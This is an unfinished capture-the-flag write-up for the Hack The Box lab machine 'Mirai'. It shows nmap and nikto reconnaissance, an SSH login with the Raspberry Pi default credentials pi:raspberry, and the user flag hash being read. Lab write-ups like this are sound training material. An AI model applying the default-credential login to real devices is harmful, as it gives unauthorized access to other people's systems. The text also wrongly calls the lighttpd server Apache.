# MIRAI WRITEUP
###### IP-Addres: 10.10.10.48
###### Operation-System: Linux
[Mirai](https://www.hackthebox.eu/home/machines/profile/64)

## RECONNAISSANCE
**NMAP Scan:**
```nmap -sS -sV 10.10.10.48

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-15 07:28 EDT
Nmap scan report for 10.10.10.48
Host is up (0.023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp   open  domain  dnsmasq 2.76
80/tcp   open  http    lighttpd 1.4.35
2010/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
```
We see, there is a Apache and a SSH server running.
We also know, Mirai was a botnet that spread by only checking IOT-Devices for default login.
So we go on the Webserver first and see: NOTHING. But why shouldn't we run nikto on it just to see if it got something juicy?
Lets see.
**NIKTO SNIPPET**
```+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
```
After we go to the admin/index.php page, we see its a raspberry pi. After googling few minutes, the default login credentials for a raspberry pi are:
*pi:raspberry*
Let's go to SSH and login.
```ssh pi@10.10.10.48
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ 
``` 
We got in. Show me what you got.
```pi@raspberrypi:~ $ ls -a
.              .config          .thumbnails           Public
..             .dbus            .xsession-errors      Templates
.Xauthority    .gstreamer-0.10  .xsession-errors.old  Videos
.asoundrc      .gtkrc-2.0       Desktop               background.jpg
.bash_history  .local           Documents             oldconffiles
.bash_logout   .pki             Downloads             python_games
.bashrc        .profile         Music
.cache         .themes          Pictures
pi@raspberrypi:~ $ cd Desktop
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
ff837707441b257a20e32199d7c8838d
```
Voilá. we got in. 

**More will come**
